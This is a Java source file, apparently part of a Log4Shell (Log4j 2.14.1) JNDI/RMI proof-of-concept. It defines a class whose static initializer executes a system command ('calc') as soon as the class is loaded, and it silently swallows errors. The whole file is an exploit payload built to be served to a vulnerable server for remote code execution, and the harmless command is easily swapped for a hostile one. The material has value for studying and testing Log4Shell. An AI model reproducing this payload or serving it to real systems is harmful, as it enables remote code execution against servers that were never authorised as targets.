package com.upuphub.jmeta.rmi.log4j2141.haker;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.SequenceInputStream;

public class ShellObj {
    static {
        try {
            Process process = Runtime.getRuntime().exec(new String[]{"calc"});
            process.waitFor();
            SequenceInputStream sis = new SequenceInputStream(process.getInputStream(), process.getErrorStream());
            BufferedReader br = new BufferedReader(new InputStreamReader(sis, "gbk"));
            String line = null;
            StringBuilder result = new StringBuilder();
            while ((line = br.readLine()) != null) {
                result.append(line).append("\r\n");
            }
            System.out.println(result.toString());
            br.close();
        } catch (Throwable ex) {

        }

    }
}
